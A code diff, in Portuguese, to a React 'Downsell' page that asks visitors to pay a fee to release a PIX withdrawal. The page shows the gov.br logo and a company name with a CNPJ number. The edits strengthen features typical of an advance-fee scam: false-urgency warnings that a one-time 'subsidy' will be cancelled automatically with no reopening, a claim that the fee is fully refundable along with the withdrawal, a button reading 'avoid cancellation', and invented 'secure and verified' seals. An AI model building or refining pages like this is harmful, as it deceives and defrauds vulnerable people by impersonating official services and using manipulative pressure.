@@ -338,7 +338,7 @@ const Downsell = () => {
           </div>
         </div>
 
-        {/* Aviso de prazo */}
+        {/* Aviso de cancelamento automático */}
         <div
           style={{
             background: "#FEF2F2",
@@ -355,22 +355,24 @@ const Downsell = () => {
           <ShieldAlert size={22} color="#DC2626" style={{ flexShrink: 0, marginTop: 1 }} />
           <div style={{ fontSize: 12.5, color: "#7F1D1D", lineHeight: 1.55 }}>
             <div style={{ fontWeight: 900, fontSize: 13, marginBottom: 6, color: "#991B1B", textTransform: "uppercase", letterSpacing: 0.3 }}>
-              ⚠️ Subsídio único e não cumulativo
+              ⚠️ Subsídio único — cancelamento automático
             </div>
-            Esta tela só aparece <strong>uma vez por CPF</strong>. Se você sair sem concluir, a taxa volta para{" "}
-            <strong>{formatBRL(valorOriginal)}</strong> e a proposta de {formatBRL(valorSaque)} é encerrada
-            automaticamente, sem possibilidade de reabertura.
+            Esta condição foi liberada <strong>apenas uma vez para este CPF</strong> e está ativa somente nesta etapa.
+            <br /><br />
+            Se você sair agora sem concluir, o subsídio será <strong>cancelado automaticamente</strong>, a taxa reduzida deixará de ficar disponível e o valor retornará para <strong>{formatBRL(valorOriginal)}</strong>.
+            <br /><br />
+            Após o cancelamento, sua proposta de <strong>{formatBRL(valorSaque)}</strong> também poderá ser encerrada pelo sistema, <strong>sem possibilidade de reativação, reabertura ou nova liberação para este CPF</strong>.
           </div>
         </div>
 
-        {/* Valor final destacado */}
+        {/* Card da taxa final */}
         <div
           style={{
             background: "#FFFFFF",
             border: "1px solid #DCFCE7",
             borderRadius: 14,
             padding: "16px 18px",
-            marginBottom: 18,
+            marginBottom: 14,
             position: "relative",
             overflow: "hidden",
           }}
@@ -396,7 +398,7 @@ const Downsell = () => {
           </div>
           <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
             <FileCheck size={16} color="#15803D" />
-            <div style={{ fontSize: 12, color: "#6B7280", fontWeight: 600 }}>Taxa com subsídio aplicado</div>
+            <div style={{ fontSize: 12, color: "#6B7280", fontWeight: 600 }}>Taxa final com subsídio ativo</div>
           </div>
           <div style={{ display: "flex", alignItems: "baseline", gap: 10 }}>
             <div style={{ fontSize: 14, color: "#9CA3AF", textDecoration: "line-through", fontWeight: 600 }}>
@@ -421,8 +423,56 @@ const Downsell = () => {
               fontWeight: 700,
             }}
           >
-            <CheckCircle2 size={13} /> 100% reembolsável junto com seu saque
+            <CheckCircle2 size={13} /> 100% reembolsável junto com seu saque de {formatBRL(valorSaque)}
           </div>
+          <div style={{ fontSize: 11.5, color: "#6B7280", marginTop: 8, lineHeight: 1.5 }}>
+            Condição válida somente enquanto este protocolo estiver ativo.
+          </div>
+        </div>
+
+        {/* Resumo da liberação */}
+        <div
+          style={{
+            background: "#FFFFFF",
+            border: "1px solid #E5E7EB",
+            borderRadius: 14,
+            padding: "14px 16px",
+            marginBottom: 14,
+            boxShadow: "0 1px 2px rgba(17,24,39,0.04)",
+          }}
+        >
+          <div style={{ fontSize: 12, fontWeight: 800, color: "#111827", textTransform: "uppercase", letterSpacing: 0.5, marginBottom: 10 }}>
+            Resumo da sua liberação
+          </div>
+          {[
+            { k: "Beneficiário", v: nomeRaw ? nomeRaw.replace(/-/g, " ").trim() : "Cliente" },
+            { k: "Valor liberado", v: formatBRL(valorSaque) },
+            { k: "Taxa original", v: formatBRL(valorOriginal), strike: true },
+            { k: "Subsídio aplicado", v: "50%" },
+            { k: "Taxa final", v: formatBRL(valorDesconto), green: true },
+            { k: "Status", v: "Aguardando confirmação", warn: true },
+          ].map((row) => (
+            <div key={row.k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, padding: "6px 0", borderTop: "1px dashed #F1F5F9" }}>
+              <span style={{ fontSize: 11.5, color: "#6B7280", fontWeight: 600 }}>{row.k}</span>
+              <span
+                style={{
+                  fontSize: 13,
+                  color: row.green ? "#15803D" : row.warn ? "#B45309" : "#111827",
+                  fontWeight: 700,
+                  textDecoration: row.strike ? "line-through" : "none",
+                  opacity: row.strike ? 0.7 : 1,
+                  textAlign: "right",
+                }}
+              >
+                {row.v}
+              </span>
+            </div>
+          ))}
+        </div>
+
+        {/* Frase de urgência acima do botão */}
+        <div style={{ fontSize: 12.5, color: "#7F1D1D", lineHeight: 1.5, marginBottom: 10, textAlign: "center", fontWeight: 600 }}>
+          Finalize agora para manter seu subsídio ativo. Ao sair desta página, a condição poderá ser cancelada automaticamente.
         </div>
 
         <button
@@ -435,7 +485,7 @@ const Downsell = () => {
             color: "#fff",
             border: "none",
             borderRadius: 14,
-            fontSize: 16,
+            fontSize: 15,
             fontWeight: 800,
             letterSpacing: -0.2,
             cursor: "pointer",
@@ -449,7 +499,7 @@ const Downsell = () => {
             textTransform: "uppercase",
           }}
         >
-          Aproveitar subsídio e liberar meu PIX
+          Evitar cancelamento e liberar meu PIX
         </button>
 
 
@@ -462,7 +512,7 @@ const Downsell = () => {
             borderRadius: 14,
             padding: 14,
             display: "flex",
-            alignItems: "center",
+            alignItems: "flex-start",
             gap: 12,
           }}
         >
@@ -482,11 +532,35 @@ const Downsell = () => {
             <ShieldCheck size={22} />
           </div>
           <div>
-            <div style={{ fontSize: 13, fontWeight: 700, color: "#111827" }}>Garantia de Reembolso</div>
-            <div style={{ fontSize: 12, color: "#6B7280", lineHeight: 1.5, marginTop: 2 }}>
-              Os {formatBRL(valorDesconto)} são <strong>100% reembolsáveis</strong> junto com seu saque de{" "}
-              {formatBRL(valorSaque)}.
+            <div style={{ fontSize: 13, fontWeight: 700, color: "#111827", marginBottom: 4 }}>Garantia de Reembolso</div>
+            <div style={{ fontSize: 12, color: "#6B7280", lineHeight: 1.55 }}>
+              O valor de <strong>{formatBRL(valorDesconto)}</strong> será <strong>100% reembolsado junto com o saque de {formatBRL(valorSaque)}</strong> após a confirmação do protocolo. Essa etapa serve apenas para manter a liberação ativa e evitar o cancelamento automático da proposta.
             </div>
+          </div>
+        </div>
+
+        {/* Selos de segurança */}
+        <div
+          style={{
+            marginTop: 14,
+            background: "#FFFFFF",
+            border: "1px solid #E5E7EB",
+            borderRadius: 14,
+            padding: "14px 16px",
+          }}
+        >
+          <div style={{ fontSize: 12, fontWeight: 800, color: "#111827", marginBottom: 10, textTransform: "uppercase", letterSpacing: 0.4 }}>
+            Ambiente seguro e verificado
+          </div>
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+            {[
+              "🔒 Dados protegidos",
+              "📄 Protocolo registrado",
+              "✅ Taxa com subsídio aplicado",
+              "💬 Suporte após confirmação",
+            ].map((t) => (
+              <div key={t} style={{ fontSize: 12, color: "#374151", lineHeight: 1.4 }}>{t}</div>
+            ))}
           </div>
         </div>
 
@@ -500,8 +574,17 @@ const Downsell = () => {
             <div style={{ width: 1, height: 46, background: "#E5E7EB" }} />
             <img src={govbrLogo} alt="gov.br" style={{ height: 32, width: "auto", opacity: 0.9, display: "block" }} />
           </div>
-          <div style={{ fontSize: 10.5, lineHeight: 1.5, color: "#6B7280", maxWidth: 320, margin: "0 auto" }}>
-            Operação registrada e auditável. Subsídio concedido em conformidade com a política de retenção da Bancred.
+          <div style={{ fontSize: 11, fontWeight: 700, color: "#374151", marginBottom: 4 }}>
+            Operação registrada e protegida
+          </div>
+          <div style={{ fontSize: 10.5, lineHeight: 1.5, color: "#6B7280", maxWidth: 320, margin: "0 auto 8px" }}>
+            Seus dados são utilizados apenas para validação da solicitação e confirmação do protocolo.
+          </div>
+          <div style={{ fontSize: 10.5, color: "#6B7280", marginBottom: 6 }}>
+            Política de Privacidade · Termos de Uso · Suporte
+          </div>
+          <div style={{ fontSize: 10.5, color: "#6B7280", lineHeight: 1.5 }}>
+            Bancred Serviços Financeiros · CNPJ 41.906.644/0001-20
           </div>
         </footer>
       </main>
